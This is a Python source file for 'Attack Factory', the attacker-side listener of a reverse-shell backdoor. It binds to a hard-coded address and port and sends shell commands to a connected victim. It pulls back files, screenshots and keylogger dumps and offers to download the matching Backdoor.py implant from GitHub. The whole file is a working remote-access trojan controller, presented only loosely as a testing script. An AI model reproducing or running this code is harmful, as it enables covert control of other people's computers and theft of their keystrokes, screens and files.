import socket
import json
import base64
import time
import os
import requests
from termcolor import colored
count = 1

def reliable_send(data):
	if type(data) == bytes:
		data = data.decode('utf-8')
	json_data = json.dumps(data)
	target.sendall(json_data.encode())

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024).decode()
			return json.loads(json_data)
		except ValueError:
			continue

def shell():
	global count
	while True: 
		command = input(colored("* Shell#-"+str(ip)+":" , 'yellow'))
		reliable_send(command)
		if command == "q":
			break

		elif command [:2] == "cd" and len(command) > 1:
			continue
		
		elif command [:12] == "keylogger_start":
			continue
		
		elif command [:8] == "download":
			result = reliable_recv()
			if result[:3] != '[!]':
				file = open(command [9:], "wb")
				file.write(base64.b64decode(result))
				file.close()
				print(colored("[+] Downloaded successfully",'green'))
			else:
				print(colored(result,'red'))

		elif command [:6] == "upload":
			try:
				with open (command [7:], "rb") as fin:
				  reliable_send (base64.b64encode(fin.read()))
				print(colored("[+] uploaded successfully",'green'))
			except :
				result = "[!] File Not Found"
				reliable_send(result)
				
		elif command [:10] == "screenshot":
			screen = open("screenshot_" + str(count) + ".png", "wb")		
			image = reliable_recv()
			image_decoded = base64.b64decode(image)
			try:
				screen.write(image_decoded)
				screen.close()
				print(colored("[+] screenshot saved successfully as screenshot_"+str(count)+ ".png ","green"))
				count += 1
			except:
				print(colored("[!] Can't took screenshot"))
				os.remove("screenshot_" + str(count) + ".png")
				
				
		
		elif command[:12] == "keylog_start":
			continue
		
		elif command[:11] == "keylog_dump":
			result = reliable_recv()
			save_log = open('KeyDumps.txt','w')
			header = "\n\n------------------------------------"+ str(time.ctime(time.time()))+"------------------------------------ \n\n"
			save_log.write(header + result)
			save_log.close()
			print(colored("[+] Saved Logs as KeyDumps.txt","green"))

		else:
			result = reliable_recv()
			print(result)

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	out_file =open(file_name, "wb")
	out_file.write(get_response.content)

def accept_conn():
	global ip
	global target

	timeout = input(colored("AttackFactory@Default~timeout( Default : 300s )~#$ ",'yellow'))
	if timeout == "":
		timeout = 300
	s.settimeout(int(timeout))
	try:
		print(colored("[+] Listening for Incoming connections....",'green'))
		target, ip = s.accept()
	except socket.error:
		retry = input(colored('[*] Retry (Y/n) : ','yellow'))
		if retry == "Y" or retry == "y":
			accept_conn()
		else:
			print(colored("[-] Exiting...",'red'))
			exit(0)	

def server():
	global s
	
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind(('192.168.2.8',44445))
	opt = input(colored('AttackFactory@Download~Backdoor.py(Y/n)~#$ ' ,'yellow'))
	if opt == "Y" or opt == "y":
		try:
			download("https://raw.githubusercontent.com/Bhadresh-Malankiya/BackdoorPy3/main/Backdoor.py")
			print(colored("[+] Downloaded Backdoor.py ",'green'))
		except:
			print(colored("[!] Failed to download Backdoor.py Download it manually from :" , 'red') + colored("\r\n https://raw.githubusercontent.com/Bhadresh-Malankiya/BackdoorPy3/main/Backdoor.py",'blue'))

	print(colored('[+] In Backdoor.py Change host ip to your ip ' ,'green'))
	s.listen(5)
	print(colored("[!] WARNING : KeyInttrupt may not work during listening..",'red'))
	accept_conn()	
	print(colored("[+] Target Connected!",'green'))
			
def main():
	banner = '''
	
	

	▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄              ▄▄▄  .▄▄ · ▄▄▄ .▄▄▄   ▌ ▐·▄▄▄ .▄▄▄  
	▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▪     ▪     ▀▄ █·▐█ ▀. ▀▄.▀·▀▄ █·▪█·█▌▀▄.▀·▀▄ █·
	▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌ ▄█▀▄  ▄█▀▄ ▐▀▀▄ ▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄ 
	██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█▌.▐▌▐█▌.▐▌▐█•█▌▐█▄▪▐█▐█▄▄▌▐█•█▌ ███ ▐█▄▄▌▐█•█▌
	·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀•  ▀█▄▀▪ ▀█▄▀▪.▀  ▀ ▀▀▀▀  ▀▀▀ .▀  ▀. ▀   ▀▀▀ .▀  ▀

	Attack Factory | Script For Testing Advance Backdoor Server | Reverse Shell

	[!] Advance Backdoor Server Having Multiple Fuctionality 'help' for more after connect

	'''
	print(colored(banner,'red'))
	server()
	shell()
	s.close()